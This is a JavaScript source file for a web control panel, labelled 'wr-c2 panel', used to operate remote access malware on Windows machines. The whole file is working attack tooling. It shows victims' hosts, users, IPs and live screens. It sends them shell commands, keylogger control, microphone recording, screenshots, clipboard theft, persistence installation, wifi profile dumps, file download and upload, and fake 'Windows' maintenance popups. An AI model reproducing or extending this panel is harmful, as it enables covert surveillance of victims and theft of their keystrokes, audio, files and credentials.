/* wr-c2 panel */
(() => {
  const $ = (s) => document.querySelector(s);
  const $$ = (s) => [...document.querySelectorAll(s)];

  const S = {
    agents: [], els: new Map(), sel: null, ws: null,
    pending: new Map(), history: [], hIndex: -1,
    view: 'grid', onlineOnly: false, sort: 'host',
    selection: new Set(), treeRoot: null, cwd: '',
    lastDetail: null,
  };

  const ICON = {
    user: '<svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg>',
    shield: '<svg viewBox="0 0 24 24"><path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z"/><path d="M9 12l2 2 4-4"/></svg>',
    cpu: '<svg viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"/><path d="M9 2v3M15 2v3M9 19v3M15 19v3M2 9h3M2 15h3M19 9h3M19 15h3"/></svg>',
    ram: '<svg viewBox="0 0 24 24"><rect x="3" y="7" width="18" height="10" rx="2"/><path d="M7 17v3M12 17v3M17 17v3M7 11h2M11 11h2M15 11h2"/></svg>',
    mouse: '<svg viewBox="0 0 24 24"><rect x="6" y="3" width="12" height="18" rx="6"/><path d="M12 3v7"/></svg>',
    monitor: '<svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg>',
    term: '<svg viewBox="0 0 24 24"><path d="M5 7l5 5-5 5"/><path d="M13 17h6"/></svg>',
    mic: '<svg viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5 11a7 7 0 0 0 14 0"/><path d="M12 18v3"/></svg>',
    power: '<svg viewBox="0 0 24 24"><path d="M12 3v9"/><path d="M6.5 6.5a8 8 0 1 0 11 0"/></svg>',
    star: '<svg viewBox="0 0 24 24"><path d="M12 3l2.8 5.7 6.2.9-4.5 4.4 1 6.2-5.5-3-5.5 3 1-6.2L3 9.6l6.2-.9z"/></svg>',
    dots: '<svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1"/><circle cx="12" cy="12" r="1"/><circle cx="12" cy="19" r="1"/></svg>',
    folder: '<svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>',
    file: '<svg viewBox="0 0 24 24"><path d="M6 3h8l4 4v14H6z"/><path d="M14 3v4h4"/></svg>',
    chev: '<svg viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"/></svg>',
    up: '<svg viewBox="0 0 24 24"><path d="M12 20V5"/><path d="M6 11l6-6 6 6"/></svg>',
  };

  // ------------------------------------------------------------------
  async function api(path, opts = {}) {
    const res = await fetch(path, { credentials: 'same-origin', ...opts });
    if (res.status === 401) { location.href = '/login'; throw new Error('auth'); }
    if (res.status === 204) return null;
    if (!res.ok) {
      let msg = res.statusText;
      try { msg = (await res.json()).detail || msg; } catch {}
      throw new Error(msg);
    }
    const ct = res.headers.get('content-type') || '';
    return ct.includes('json') ? res.json() : res.text();
  }

  function esc(s) {
    return String(s ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }
  function bytes(n) {
    n = Number(n) || 0;
    if (n < 1024) return n + ' B';
    if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
    if (n < 1073741824) return (n / 1048576).toFixed(1) + ' MB';
    return (n / 1073741824).toFixed(1) + ' GB';
  }
  function ago(ts) {
    if (!ts) return '—';
    const d = Math.max(0, Date.now() / 1000 - ts);
    if (d < 60) return 'just now';
    if (d < 3600) return Math.floor(d / 60) + 'm ago';
    if (d < 86400) return Math.floor(d / 3600) + 'h ago';
    return Math.floor(d / 86400) + 'd ago';
  }
  function toast(msg) {
    const el = $('#toast');
    el.textContent = msg;
    el.classList.add('show');
    clearTimeout(el._t);
    el._t = setTimeout(() => el.classList.remove('show'), 2200);
  }

  // ------------------------------------------------------------------
  // cards
  // ------------------------------------------------------------------
  function sig(a) {
    return [a.host, a.user, a.id, a.ip, a.os_short, a.arch, a.monitors, a.cpu, a.ram,
            a.admin, a.cc, a.ver].join('|');
  }

  function cardHTML(a) {
    const online = a.online;
    return `
      <div class="thumb">
        ${online ? `<img src="/api/agents/${a.id}/preview.jpg?n=${a.frame}" alt="">` : ''}
        <div class="ghost">${online ? '' : 'offline'}</div>
        <div class="thumb-actions">
          <button data-act="pin" title="pin">${ICON.star}</button>
          <button data-act="menu" title="actions">${ICON.dots}</button>
        </div>
        <div class="thumb-bar">
          <span class="live ${online ? '' : 'offline'}"><i></i>${online ? 'Online' : 'Offline'}
            <em>·</em> ${online ? 'now' : ago(a.last_seen)}</span>
          <span class="ping ${pingClass(a.ping)}">${ICON.mouse}${fmtPing(a.ping)}</span>
        </div>
      </div>
      <div class="body">
        <div class="row title">
          <span class="flag">${esc(a.cc || '??')}</span>
          <b>${esc(a.host || 'unknown')}</b>
          ${a.admin ? '<span class="badge">admin</span>' : ''}
          ${ICON.shield}
        </div>
        <div class="row sub">${ICON.user}${esc(a.user || '—')}</div>
        <div class="row ids">
          <span>${esc(a.ip || '—')}</span><span class="dot"></span><span>${esc(a.id.slice(0, 8))}</span>
        </div>
        <div class="row specs">
          <span class="chip-os">${esc(a.os_short || 'WIN')}</span>
          <span class="mono">${esc(a.arch || 'amd64')}</span>
          <span>${ICON.monitor}</span><span class="mono">${a.monitors || 1}</span>
          <span class="mono">v${esc((a.ver || '0').replace(/^v/, ''))}</span>
        </div>
        <div class="row hw">
          <span class="chip cpu">${ICON.cpu}${esc(a.cpu || 'unknown cpu')}</span>
          <span class="chip ram">${ICON.ram}${Math.round(a.ram || 0)} GB</span>
        </div>
        <div class="row actions">
          <button class="primary" data-act="open">${ICON.term}Commands</button>
          <button class="ibtn" data-act="mic" title="record microphone">${ICON.mic}</button>
          <button class="ibtn" data-act="screen" title="live screen">${ICON.monitor}</button>
          <button class="ibtn danger" data-act="kill" title="terminate">${ICON.power}</button>
        </div>
      </div>`;
  }

  function fmtPing(ms) {
    return ms == null ? '—' : Math.max(1, Math.round(ms)) + ' ms';
  }

  function pingClass(ms) {
    if (ms == null) return '';
    if (ms < 60) return 'good';
    if (ms < 160) return 'mid';
    return 'bad';
  }

  function updateCard(a) {
    let el = S.els.get(a.id);
    const s = sig(a);
    if (!el) {
      el = document.createElement('article');
      el.className = 'card';
      el.dataset.id = a.id;
      el.innerHTML = cardHTML(a);
      el._sig = s;
      $('#grid').appendChild(el);
      S.els.set(a.id, el);
    } else if (el._sig !== s) {
      el.innerHTML = cardHTML(a);
      el._sig = s;
    }
    el.classList.toggle('off', !a.online);
    el.classList.toggle('sel', S.selection.has(a.id));
    const live = el.querySelector('.live');
    if (live) {
      live.classList.toggle('offline', !a.online);
      live.innerHTML = `<i></i>${a.online ? 'Online' : 'Offline'} <em>·</em> ${a.online ? 'now' : ago(a.last_seen)}`;
    }
    const ping = el.querySelector('.ping');
    if (ping) {
      ping.className = 'ping ' + pingClass(a.ping);
      ping.innerHTML = ICON.mouse + fmtPing(a.ping);
    }
  }

  function applyFilter(list) {
    const q = $('#q').value.trim().toLowerCase();
    return list.filter((a) => {
      if (S.onlineOnly && !a.online) return false;
      if (!q) return true;
      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu].join(' ').toLowerCase().includes(q);
    });
  }

  function sortList(list) {
    const key = S.sort;
    return [...list].sort((a, b) => {
      if (key === 'online') return (b.online - a.online) || (a.host || '').localeCompare(b.host || '');
      if (key === 'ping') return (a.ping ?? 9999) - (b.ping ?? 9999);
      return (a.host || '').localeCompare(b.host || '');
    });
  }

  function render() {
    const visible = sortList(applyFilter(S.agents));
    const seen = new Set();
    for (const a of visible) { updateCard(a); seen.add(a.id); }

    for (const [id, el] of S.els) {
      if (!seen.has(id)) { el.remove(); S.els.delete(id); }
    }

    // preserve order
    const grid = $('#grid');
    visible.forEach((a) => {
      const el = S.els.get(a.id);
      if (el && grid.lastElementChild !== el) { /* order handled below */ }
    });
    visible.forEach((a) => grid.appendChild(S.els.get(a.id)));

    $('#empty').classList.toggle('hidden', S.agents.length > 0);
  }

  async function loadState() {
    try {
      const data = await api('/api/state');
      S.agents = data.agents;
      render();
    } catch {}
  }

  // ------------------------------------------------------------------
  // modal
  // ------------------------------------------------------------------
  function agentById(id) { return S.agents.find((a) => a.id === id); }

  async function openAgent(id) {
    const a = agentById(id);
    if (!a) return;
    S.sel = id;
    $('#modal').classList.remove('hidden');
    $('#mHost').textContent = a.host || 'unknown';
    $('#mMeta').textContent = [a.user, a.os, a.ip, a.id.slice(0, 8)].filter(Boolean).join('  ·  ');
    $('#mPing').textContent = fmtPing(a.ping);
    $('#term').innerHTML = '';
    $('#keyOut').textContent = '';
    $('#sysInfo').innerHTML = '';
    $('#sysOut').textContent = '';
    $('#audioWrap').innerHTML = '';
    $('#screenImg').removeAttribute('src');

    term(`session ${a.host} · ${a.online ? 'live' : 'offline'}`, 'sys');

    try {
      const d = await api('/api/agents/' + encodeURIComponent(id));
      S.lastDetail = d;
      renderStats(d.agent);
      renderTransfers(d.files || []);
      renderKeylog(d.keylogs || []);
      for (const c of [...d.commands].reverse()) {
        if (c.status !== 'done' || !c.body) continue;
        try { renderBody(JSON.parse(c.body), c.module, true); } catch {}
      }
    } catch (e) { term(e.message, 'err'); }

    switchPane('console');
    loadDrives();
  }

  function closeModal() { $('#modal').classList.add('hidden'); S.sel = null; }

  function switchPane(name) {
    $$('.rtab').forEach((t) => t.classList.toggle('active', t.dataset.pane === name));
    $$('.pane').forEach((p) => p.classList.toggle('active', p.id === 'pane-' + name));
    if (name === 'screen') showScreen();
  }

  function showScreen() {
    if (!S.sel) return;
    const a = agentById(S.sel);
    const img = $('#screenImg');
    if (a && a.has_preview) {
      img.src = `/api/agents/${S.sel}/preview.jpg?n=${a.frame}`;
      $('#screenEmpty').classList.add('hidden');
    }
  }

  function term(text, cls = 'out') {
    const box = $('#term');
    if (!box) return;
    const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 40;
    const div = document.createElement('div');
    div.className = 'ln ' + cls;
    div.textContent = text;
    box.appendChild(div);
    if (atBottom) box.scrollTop = box.scrollHeight;
    while (box.childElementCount > 2500) box.removeChild(box.firstChild);
  }

  function renderBody(body, module) {
    if (!body) return;
    if (body.stdout) term(body.stdout.replace(/\s+$/, ''), 'out');
    if (body.stderr) term(body.stderr.replace(/\s+$/, ''), 'err');
    if (body.error) term(body.error, 'err');
    if (module === 'sysinfo') renderStats(null, body.meta);
  }

  function renderStats(agent, meta) {
    const box = $('#sysInfo');
    if (agent) {
      box.innerHTML = [
        ['host', agent.host], ['user', agent.user], ['ip', agent.ip],
        ['os', agent.os], ['arch', agent.arch], ['cpu', agent.cpu],
        ['ram', (Math.round(agent.ram) || 0) + ' GB'], ['gpu', agent.gpu],
        ['monitors', agent.monitors], ['admin', agent.admin ? 'yes' : 'no'],
      ].map(([k, v]) => `<div class="stat"><div class="k">${k}</div><div class="v">${esc(v ?? '—')}</div></div>`).join('');
    } else if (meta) {
      const flat = Object.entries(meta).filter(([, v]) => typeof v !== 'object' || v === null);
      box.innerHTML = flat.map(([k, v]) => `<div class="stat"><div class="k">${esc(k)}</div><div class="v">${esc(v)}</div></div>`).join('');
    }
  }

  // ------------------------------------------------------------------
  // commands
  // ------------------------------------------------------------------
  async function run(module, args = {}, label = null) {
    if (!S.sel) return;
    try {
      const { id } = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, args }),
      });
      S.pending.set(id, { module, label });
      if (label) term(label, 'cmd');
      else if (module === 'shell') term(args.cmd || '', 'cmd');
    } catch (e) { term(e.message, 'err'); }
  }

  // ------------------------------------------------------------------
  // files
  // ------------------------------------------------------------------
  async function loadDrives() {
    const tree = $('#ftree');
    tree.innerHTML = '<div class="node"><span class="nm">loading drives…</span></div>';
    try {
      const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module: 'drives', args: {} }),
      });
      S.pending.set(r.id, { module: 'drives' });
    } catch (e) { tree.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`; }
  }

  function renderDrives(drives) {
    const tree = $('#ftree');
    tree.innerHTML = '';
    if (!drives || !drives.length) {
      tree.innerHTML = '<div class="node"><span class="nm">no drives reported</span></div>';
      return;
    }
    for (const d of drives) {
      const node = makeNode({ name: d.name, path: d.name, dir: true, free: d.free, total: d.total }, true);
      tree.appendChild(node);
    }
  }

  function makeNode(entry, isRoot = false) {
    const wrap = document.createElement('div');
    const row = document.createElement('div');
    row.className = 'node' + (entry.dir ? ' dir' : '');
    const size = entry.dir
      ? (entry.total ? `${bytes(entry.free)} free` : '')
      : bytes(entry.size);
    row.innerHTML = `
      <span class="ic${entry.dir ? ' chev' : ''}">${entry.dir ? ICON.chev : ICON.file}</span>
      <span class="nm">${esc(entry.name)}</span>
      <span class="sz">${size}</span>
      <span class="dt">${entry.mtime ? new Date(entry.mtime).toLocaleDateString() : ''}</span>
      <span class="go">${entry.dir ? '' : '↓'}</span>`;
    wrap.appendChild(row);

    if (entry.dir) {
      const kids = document.createElement('div');
      kids.className = 'kids hidden';
      wrap.appendChild(kids);

      row.addEventListener('click', async (ev) => {
        ev.stopPropagation();
        if (row.dataset.loaded === '1') {
          kids.classList.toggle('hidden');
          row.classList.toggle('open');
          return;
        }
        if (!S.sel) return;
        row.dataset.loaded = '1';
        row.classList.add('open');
        kids.classList.remove('hidden');
        kids.innerHTML = '<div class="node"><span class="nm">…</span></div>';

        try {
          const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ module: 'ls', args: { path: entry.path } }),
          });
          S.pending.set(r.id, { module: 'ls', target: kids });
        } catch (e) {
          kids.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`;
        }
      });
    } else {
      row.addEventListener('click', () => {
        term(`download ${entry.path}`, 'cmd');
        run('download', { path: entry.path });
      });
    }

    return wrap;
  }

  function renderListing(container, entries) {
    container.innerHTML = '';
    if (!entries || !entries.length) {
      container.innerHTML = '<div class="node"><span class="nm">empty</span></div>';
      return;
    }
    const dirs = entries.filter((e) => e.dir).sort((a, b) => a.name.localeCompare(b.name));
    const files = entries.filter((e) => !e.dir).sort((a, b) => a.name.localeCompare(b.name));
    for (const e of [...dirs, ...files]) container.appendChild(makeNode(e));
  }

  // ------------------------------------------------------------------
  // transfers
  // ------------------------------------------------------------------
  function renderTransfers(files) {
    const box = $('#xferList');
    const rows = files.map((f) => `
      <div class="xrow">
        <span class="kd">${esc(f.kind || 'file')}</span>
        <span class="nm" title="${esc(f.path || f.name)}">${esc(f.name)}</span>
        <span class="sz">${bytes(f.size)}</span>
        <a class="btn" href="/api/files/${f.id}" target="_blank" rel="noopener">open</a>
      </div>`).join('');
    box.dataset.files = JSON.stringify(files);
    box.innerHTML = rows || '<div class="node"><span class="nm">no transfers yet</span></div>';
  }

  function addTransfer(detail) {
    const box = $('#xferList');
    let row = box.querySelector(`[data-xid="${detail.id}"]`);
    if (!row) {
      row = document.createElement('div');
      row.className = 'xrow';
      row.dataset.xid = detail.id;
      row.innerHTML = `<span class="kd">${esc(detail.kind || 'transfer')}</span>
        <span class="nm">${esc(detail.name || 'transfer')}</span>
        <span class="bar"><i></i></span>
        <span class="sz">0%</span>`;
      box.prepend(row);
    }
    row.querySelector('.bar i').style.width = (detail.pct || 0) + '%';
    row.querySelector('.sz').textContent = (detail.pct || 0) + '%';
  }

  // ------------------------------------------------------------------
  // keylog / media
  // ------------------------------------------------------------------
  function renderKeylog(logs) {
    $('#keyOut').textContent = logs.map((l) => l.text).join('');
    const pre = $('#keyOut');
    pre.scrollTop = pre.scrollHeight;
  }

  function appendKeylog(text) {
    const pre = $('#keyOut');
    pre.textContent += text;
    if (pre.textContent.length > 400000) pre.textContent = pre.textContent.slice(-300000);
    pre.scrollTop = pre.scrollHeight;
  }

  function showFile(f) {
    if (!f) return;
    if (f.kind === 'audio') {
      $('#audioWrap').innerHTML = `<audio controls autoplay src="/api/files/${f.id}"></audio>`;
      switchPane('media');
    } else if (f.kind === 'screenshot') {
      $('#lightboxImg').src = '/api/files/' + f.id;
      $('#lightbox').classList.remove('hidden');
      switchPane('screen');
    }
  }

  // ------------------------------------------------------------------
  // toolbar
  // ------------------------------------------------------------------
  function wireToolbar() {
    $$('.tbtn[data-tool]').forEach((b) => b.addEventListener('click', async () => {
      const t = b.dataset.tool;
      if (t === 'filter') { S.onlineOnly = !S.onlineOnly; b.classList.toggle('active', S.onlineOnly); render(); }
      if (t === 'sort') {
        S.sort = S.sort === 'host' ? 'online' : S.sort === 'online' ? 'ping' : 'host';
        toast('sort: ' + S.sort); render();
      }
      if (t === 'select') { applyFilter(S.agents).forEach((a) => S.selection.add(a.id)); render(); }
      if (t === 'clear') { S.selection.clear(); render(); }
      if (t === 'list') { S.view = 'list'; $('#grid').classList.add('list'); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.remove('active')); }
      if (t === 'grid') { S.view = 'grid'; $('#grid').classList.remove('list'); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.remove('active')); }
      if (t === 'power') {
        const ids = S.selection.size ? [...S.selection] : (S.sel ? [S.sel] : []);
        if (!ids.length) return toast('select an agent first');
        if (!confirm(`terminate ${ids.length} agent(s)?`)) return;
        for (const id of ids) {
          try {
            await api(`/api/agents/${encodeURIComponent(id)}/cmd`, {
              method: 'POST', headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ module: 'exit', args: {} }),
            });
          } catch {}
        }
        toast('terminate sent');
      }
    }));

    $('#q').addEventListener('input', render);
    $('#mClose').addEventListener('click', closeModal);
    $('#modal').addEventListener('click', (e) => { if (e.target.id === 'modal') closeModal(); });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') { $('#lightbox').classList.add('hidden'); if (!$('#modal').classList.contains('hidden')) closeModal(); }
    });
    $('#lightbox').addEventListener('click', () => $('#lightbox').classList.add('hidden'));
  }

  function wireGrid() {
    $('#grid').addEventListener('click', (e) => {
      const card = e.target.closest('.card');
      if (!card) return;
      const id = card.dataset.id;
      const act = e.target.closest('[data-act]')?.dataset.act;

      if (act === 'open') return openAgent(id);
      if (act === 'screen') { openAgent(id).then(() => switchPane('screen')); return; }
      if (act === 'mic') {
        S.sel = id;
        run('mic', { seconds: 10 }, 'recording microphone 10s');
        return;
      }
      if (act === 'pin') {
        S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id);
        render();
        return;
      }
      if (act === 'kill') {
        if (!confirm('terminate ' + (agentById(id)?.host || id) + '?')) return;
        api(`/api/agents/${encodeURIComponent(id)}/cmd`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ module: 'exit', args: {} }),
        }).then(() => toast('terminate sent')).catch((err) => toast(err.message));
        return;
      }
      if (act === 'menu') { S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id); render(); return; }

      if (S.selection.size) {
        S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id);
        render();
      } else {
        openAgent(id);
      }
    });
  }

  // ------------------------------------------------------------------
  // modal wiring
  // ------------------------------------------------------------------
  function quickButtons() {
    const items = [
      ['sysinfo', 'sysinfo'], ['ps', 'processes'], ['drives', 'drives'],
      ['keylog start', 'keylog', { action: 'start' }],
      ['persist', 'persist', { action: 'install' }],
      ['services', 'services', { action: 'list' }],
      ['wifi', 'wifi', { action: 'profiles' }],
      ['software', 'software'], ['startup', 'startup'], ['net', 'net'],
      ['clipboard', 'clipboard', { action: 'get' }],
    ];
    $('#quick').innerHTML = items
      .map(([label], i) => `<button class="qbtn" data-q="${i}">${esc(label)}</button>`).join('');
    $('#quick').onclick = (e) => {
      const b = e.target.closest('[data-q]');
      if (!b) return;
      const [label, mod, args] = items[+b.dataset.q];
      run(mod, args || {}, label);
    };

    const sys = [
      ['lock', 'power', { action: 'lock' }],
      ['reboot', 'power', { action: 'reboot' }],
      ['shutdown', 'power', { action: 'shutdown' }],
      ['volume +', 'volume', { action: 'up', steps: 5 }],
      ['volume -', 'volume', { action: 'down', steps: 5 }],
      ['mute', 'volume', { action: 'mute' }],
      ['say', 'say', { text: 'hello from the other side' }],
      ['popup', 'msgbox', { title: 'Windows', text: 'system maintenance' }],
      ['search *.txt', 'search', { path: 'C:\\Users', pattern: '*.txt', max: 200 }],
      ['registry HKCU Run', 'registry', { action: 'get', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' }],
    ];
    $('#sysQuick').innerHTML = sys
      .map(([label], i) => `<button class="qbtn" data-s="${i}">${esc(label)}</button>`).join('');
    $('#sysQuick').onclick = (e) => {
      const b = e.target.closest('[data-s]');
      if (!b) return;
      const [label, mod, args] = sys[+b.dataset.s];
      run(mod, args, label);
    };
  }

  function wireModal() {
    $$('.rtab').forEach((t) => t.addEventListener('click', () => {
      switchPane(t.dataset.pane);
      if (t.dataset.pane === 'xfer') refreshDetail();
    }));

    $('#cmdForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const cmd = $('#cmdInput').value.trim();
      if (!cmd || !S.sel) return;
      S.history.push(cmd); S.hIndex = S.history.length;
      $('#cmdInput').value = '';
      run('shell', { cmd, shell: $('#shell').value }, null);
    });
    $('#cmdInput').addEventListener('keydown', (e) => {
      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (!S.history.length) return;
        S.hIndex = Math.max(0, S.hIndex - 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        S.hIndex = Math.min(S.history.length, S.hIndex + 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      }
    });

    $('#fGo').addEventListener('click', () => {
      const p = $('#fPath').value.trim();
      if (!p || !S.sel) return;
      S.cwd = p;
      const box = $('#ftree');
      box.innerHTML = '<div class="node"><span class="nm">loading…</span></div>';
      api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module: 'ls', args: { path: p } }),
      }).then((r) => S.pending.set(r.id, { module: 'ls', target: box }));
    });
    $('#fPath').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); $('#fGo').click(); } });
    $('#fHome').addEventListener('click', () => { $('#fPath').value = ''; loadDrives(); });
    $('#fRefresh').addEventListener('click', () => {
      const p = $('#fPath').value.trim();
      if (p) $('#fGo').click(); else loadDrives();
    });

    $('#modal').addEventListener('click', (e) => {
      const act = e.target.closest('[data-act]')?.dataset.act;
      if (!act) return;
      if (act === 'screenshot') run('screenshot', {}, 'capture');
      if (act === 'preview-pause') {
        const btn = e.target.closest('[data-act]');
        const paused = btn.dataset.paused === '1';
        btn.dataset.paused = paused ? '0' : '1';
        btn.textContent = paused ? 'pause stream' : 'resume stream';
        run('preview', { action: paused ? 'resume' : 'pause' },
            paused ? 'resume preview' : 'pause preview');
      }
      if (act === 'mic') run('mic', { seconds: +$('#micSecs').value || 10 }, 'record mic');
      if (act === 'clip-get') run('clipboard', { action: 'get' }, 'clipboard read');
      if (act === 'clip-set') {
        const text = prompt('clipboard text');
        if (text) run('clipboard', { action: 'set', text }, 'clipboard write');
      }
      if (act === 'say') {
        const text = prompt('say what?', 'hello');
        if (text) run('say', { text }, 'speak');
      }
      if (act === 'msgbox') {
        const text = prompt('message text', 'maintenance');
        if (text) run('msgbox', { title: 'Windows', text }, 'popup');
      }
      if (act === 'vol-mute') run('volume', { action: 'mute' }, 'mute');
      if (act === 'key-start') run('keylog', { action: 'start' }, 'keylog on');
      if (act === 'key-stop') run('keylog', { action: 'stop' }, 'keylog off');
      if (act === 'key-dump') run('keylog', { action: 'dump' }, 'keylog dump');
      if (act === 'key-clear') {
        $('#keyOut').textContent = '';
        run('keylog', { action: 'clear' }, 'keylog clear');
      }
    });

    $('#pvInterval').addEventListener('change', (e) => {
      run('preview', { action: 'set', interval_ms: +e.target.value }, 'preview interval');
    });

    $('#filePicker').addEventListener('change', async (ev) => {
      const file = ev.target.files[0];
      ev.target.value = '';
      if (!file || !S.sel) return;
      const remote = prompt('remote path', 'C:\\Users\\Public\\' + file.name);
      if (!remote) return;
      const fd = new FormData();
      fd.append('path', remote);
      fd.append('file', file);
      term(`upload ${file.name} -> ${remote}`, 'cmd');
      try {
        const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/upload`, { method: 'POST', body: fd });
        term(`queued ${r.chunks} chunk(s) · ${bytes(r.size)}`, 'sys');
      } catch (e) { term(e.message, 'err'); }
    });
  }

  async function refreshDetail() {
    if (!S.sel) return;
    try {
      const d = await api('/api/agents/' + encodeURIComponent(S.sel));
      renderTransfers(d.files || []);
    } catch {}
  }

  // ------------------------------------------------------------------
  // websocket
  // ------------------------------------------------------------------
  function connect() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${proto}//${location.host}/panel/ws`);
    S.ws = ws;

    ws.onmessage = (ev) => {
      let m;
      try { m = JSON.parse(ev.data); } catch { return; }

      if (m.t === 'agent') {
        const a = m.agent;
        if (a.removed) {
          S.agents = S.agents.filter((x) => x.id !== a.id);
          render();
          return;
        }
        const idx = S.agents.findIndex((x) => x.id === a.id);
        if (idx >= 0) S.agents[idx] = { ...S.agents[idx], ...a };
        else S.agents.push(a);
        render();
        if (a.id === S.sel && $('#mHost').textContent !== a.host) {
          $('#mHost').textContent = a.host || 'unknown';
        }
        return;
      }

      if (m.t === 'frame') {
        const a = S.agents.find((x) => x.id === m.agent_id);
        if (a) { a.frame = m.n; a.online = true; }
        const el = S.els.get(m.agent_id);
        const img = el?.querySelector('.thumb img');
        if (img) img.src = `/api/agents/${m.agent_id}/preview.jpg?n=${m.n}`;
        const ghost = el?.querySelector('.ghost');
        if (ghost) ghost.textContent = '';
        if (m.agent_id === S.sel && $('#pane-screen').classList.contains('active')) {
          $('#screenImg').src = `/api/agents/${m.agent_id}/preview.jpg?n=${m.n}`;
          $('#screenEmpty').classList.add('hidden');
        }
        return;
      }

      if (m.t === 'ping') {
        const a = S.agents.find((x) => x.id === m.agent_id);
        if (a) a.ping = m.ms;
        if (m.agent_id === S.sel) $('#mPing').textContent = fmtPing(m.ms);
        const el = S.els.get(m.agent_id);
        const ping = el?.querySelector('.ping');
        if (ping) {
          ping.className = 'ping ' + pingClass(m.ms);
          ping.innerHTML = ICON.mouse + fmtPing(m.ms);
        }
        return;
      }

      if (m.agent_id && m.agent_id !== S.sel) return;

      if (m.t === 'result') {
        const p = S.pending.get(m.cmd_id);
        S.pending.delete(m.cmd_id);

        if (p?.module === 'ls') {
          const meta = m.body?.meta;
          if (p.target && meta?.entries) renderListing(p.target, meta.entries);
          return;
        }
        if (p?.module === 'drives') {
          renderDrives(m.body?.meta?.drives);
          return;
        }
        if (p?.module === 'upload') return;
        renderBody(m.body, p?.module || m.module);
        if (p?.module === 'clipboard') $('#clipOut').textContent = m.body?.stdout || '';
        return;
      }

      if (m.t === 'keylog') appendKeylog(m.text);

      if (m.t === 'progress') {
        addTransfer({ id: m.xid, pct: m.pct, kind: m.kind, name: m.name });
        return;
      }

      if (m.t === 'file') {
        const f = m.file;
        term(`file · ${f.name} · ${bytes(f.size)}`, 'sys');
        addTransfer({ id: f.id, kind: f.kind, name: f.name, pct: 100 });
        refreshDetail();
        showFile(f);
        return;
      }

      if (m.t === 'log') term(m.text, 'sys');
    };

    ws.onclose = () => setTimeout(connect, 2200);
    ws.onerror = () => ws.close();
  }

  // ------------------------------------------------------------------
  // boot
  // ------------------------------------------------------------------
  wireToolbar();
  wireGrid();
  wireModal();
  quickButtons();
  loadState();
  connect();
  setInterval(loadState, 15000);
})();
